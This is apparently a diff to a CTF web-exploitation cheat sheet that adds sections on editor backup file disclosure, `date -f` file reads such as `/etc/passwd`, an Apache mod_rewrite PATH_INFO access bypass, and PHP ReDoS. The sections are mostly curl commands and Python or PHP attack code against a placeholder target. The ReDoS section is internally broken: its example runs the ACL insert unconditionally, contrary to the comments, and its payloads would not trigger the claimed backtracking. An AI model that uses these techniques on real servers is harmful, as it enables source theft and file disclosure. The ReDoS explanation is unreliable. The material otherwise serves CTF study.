@@ -35,6 +35,10 @@
 - [PHP7 OPcache Binary Webshell + LD_PRELOAD disable_functions Bypass (ALICTF 2016)](#php7-opcache-binary-webshell--ld_preload-disable_functions-bypass-alictf-2016)
 - [Wget GET Parameter Filename Trick for PHP Shell Upload (SECUINSIDE 2016)](#wget-get-parameter-filename-trick-for-php-shell-upload-secuinside-2016)
 - [Tar Filename Command Injection (CyberSecurityRumble 2016)](#tar-filename-command-injection-cybersecurityrumble-2016)
+- [Editor Backup File Source Disclosure (h4ckc0n 2017)](#editor-backup-file-source-disclosure-h4ckc0n-2017)
+- [date -f Arbitrary File Read (Can-CWIC 2017)](#date--f-arbitrary-file-read-can-cwic-2017)
+- [Apache mod_rewrite PATH_INFO Bypass (EKOPARTY 2017)](#apache-mod_rewrite-path_info-bypass-ekoparty-2017)
+- [PHP ReDoS to Skip Code Execution (CODE BLUE 2017)](#php-redos-to-skip-code-execution-code-blue-2017)
 - [PNG/PHP Polyglot Upload + Double Extension + disable_functions Bypass (MetaCTF Flash 2026)](#pngphp-polyglot-upload--double-extension--disable_functions-bypass-metactf-flash-2026)
 - [Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)](#pickle-chaining-via-stop-opcode-stripping-volgactf-2013) *(stub — see [server-side-deser.md](server-side-deser.md))*
 - [Java Deserialization (ysoserial)](#java-deserialization-ysoserial) *(stub — see [server-side-deser.md](server-side-deser.md))*
@@ -710,6 +714,148 @@ ini_get('disable_functions');
 **When to recognize:** File upload challenge with image-only restrictions. Check `phpinfo()` output for `disable_functions` list. If all exec functions are blocked, pivot to pure PHP filesystem functions.
 
 **References:** MetaCTF Flash CTF 2026 "Brand Kit"
+
+---
+
+## Editor Backup File Source Disclosure (h4ckc0n 2017)
+
+**Pattern:** Text editors leave backup files alongside the original when saving. These are often left on web servers and served as plain text, leaking PHP source before execution.
+
+| Editor | Backup pattern |
+|--------|---------------|
+| gedit  | `file~` |
+| vim    | `.file.swp` (also `.file.swn`, `.file.swo`) |
+| nano   | `file~` |
+| emacs  | `file~` and `#file#` |
+
+```bash
+# Check common backup variants for a target file
+TARGET="http://target/checker.php"
+for suffix in "~" ".swp" ".bak" ".orig"; do
+    curl -s -o /dev/null -w "%{http_code} $TARGET$suffix\n" "$TARGET$suffix"
+done
+# vim hidden-file backup:
+curl -s "http://target/.checker.php.swp"
+# emacs auto-save:
+curl -s "http://target/#checker.php#"
+```
+
+```bash
+# Practical: grab vim swap file and recover source
+curl -o checker.swp "http://target/.checker.php.swp"
+vim -r checker.swp          # opens recovered file in vim
+# Or: strings checker.swp   # quick content extraction
+```
+
+**Key insight:** Always check for `filename~`, `.filename.swp`, `#filename#` variants when hunting for source disclosure. Combine with directory listing or known filenames from JS/HTML comments to enumerate candidates.
+
+---
+
+## date -f Arbitrary File Read (Can-CWIC 2017)
+
+**Pattern:** The GNU `date` command's `-f`/`--file` flag reads each line from a file and processes it as a date format string. When user-controlled input reaches a `date` invocation as an argument, this provides arbitrary file read.
+
+```bash
+# Normal behavior: date -f /etc/passwd reads each line as a date string
+# Lines that aren't valid dates print an error message containing the line content
+date -f /etc/passwd
+# Output includes: date: invalid date 'root:x:0:0:root:/root:/bin/bash'
+# → file contents leak through error messages
+```
+
+```python
+import subprocess
+
+# Simulate: if web app passes user arg to date command
+# e.g., os.system(f"date -d '{user_input}'") where user controls the flag value
+# Or: user_input = "-f /etc/passwd" injected into arguments
+
+# Brute-force readable files
+targets = ['/etc/passwd', '/flag', '/flag.txt', '/home/ctf/flag']
+for t in targets:
+    result = subprocess.run(['date', '-f', t], capture_output=True, text=True)
+    print(result.stderr)  # errors contain file content
+```
+
+```bash
+# When command injection is available and date is accessible:
+curl "http://target/cgi-bin/app.cgi" --data "cmd=date+-f+/flag.txt"
+# Response error output reveals flag content
+```
+
+**Key insight:** `date --file` / `date -f` provides arbitrary file read when the `date` command has user-controlled arguments. Error messages include the unrecognized line content, leaking the file line-by-line. Works on any system with GNU coreutils `date`.
+
+---
+
+## Apache mod_rewrite PATH_INFO Bypass (EKOPARTY 2017)
+
+**Pattern:** Apache mod_rewrite rules match on the request path using regex. Accessing `/index.php/getflag` matches a permissive rule for `/index.php` (allowing the PHP file to handle the request) before any restrictive rule for `/getflag` applies. PHP receives `/getflag` as `PATH_INFO`.
+
+```apache
+# Vulnerable .htaccess / rewrite rules:
+RewriteRule ^index\.php$ index.php [L]          # allows access to index.php
+RewriteRule ^getflag$    /forbidden.html [R,L]  # blocks /getflag directly
+```
+
+```bash
+# Direct access — blocked by second rule:
+curl http://target/getflag          # → 403 or redirect to forbidden.html
+
+# PATH_INFO bypass — matches first rule, PHP gets PATH_INFO=/getflag:
+curl http://target/index.php/getflag   # → executes index.php with PATH_INFO=/getflag
+```
+
+```php
+// In index.php — reads PATH_INFO to dispatch
+$action = $_SERVER['PATH_INFO'];   // "/getflag"
+if ($action === '/getflag') {
+    echo $flag;
+}
+```
+
+**Rule ordering matters:** Apache evaluates RewriteRules top-to-bottom and stops at the first `[L]` match. A permissive rule for the PHP file catches `/index.php/anything` before any restrictive rule for the suffix path.
+
+**Key insight:** mod_rewrite rule ordering + PHP PATH_INFO interaction: `/index.php/protected-path` bypasses access controls by matching the PHP file rule first. PHP's `$_SERVER['PATH_INFO']` receives the suffix, letting the application's own routing dispatch to the protected handler.
+
+---
+
+## PHP ReDoS to Skip Code Execution (CODE BLUE 2017)
+
+**Pattern:** PHP's `preg_match()` is synchronous. When a regex with catastrophic backtracking complexity matches user-controlled input, the PCRE engine times out and `preg_match()` returns `false`. Code that runs after the regex check (e.g., an INSERT into an ACL table) never executes. A missing ACL record then becomes equivalent to having no access restriction — or the most permissive default.
+
+```php
+// Vulnerable pattern: regex check followed by ACL insert
+if (preg_match('/^(ADMIN-+)+$/', $role)) {
+    // If this times out (returns false), the block is never entered
+    // AND code after the if-block may also be skipped or behave differently
+}
+// ACL INSERT that only runs on successful match:
+$db->query("INSERT INTO acl (user, role) VALUES (?, ?)", [$user, 'ADMIN']);
+// Missing ACL row = no restriction applied
+```
+
+```python
+import requests
+
+# Payload: trigger catastrophic backtracking on the regex (ADMIN-+)+
+# The nested quantifier causes exponential backtracking with enough repetitions
+redos_payload = 'ADMIN-' + '-' * 50 + '!'   # trailing ! forces full backtrack
+# Or the classic: ADMIN--(###A)*  structure repeated
+
+r = requests.post('http://target/register', data={
+    'username': 'victim',
+    'role': redos_payload
+})
+# If the ACL INSERT is skipped, the user now has no restriction on their account
+```
+
+**Backtracking trigger patterns:**
+```text
+ADMIN--(###A)*  repeated 20+ times
+(ADMIN-+)+X     where X doesn't match, forcing full backtrack
+```
+
+**Key insight:** PHP ReDoS can skip subsequent code entirely — a timed-out `preg_match()` returns `false` (not `0`), and any code gated on that check (like an ACL table INSERT) is silently skipped. This is not just a DoS: it acts as a code execution bypass when missing side effects change application security state.
 
 ---
 
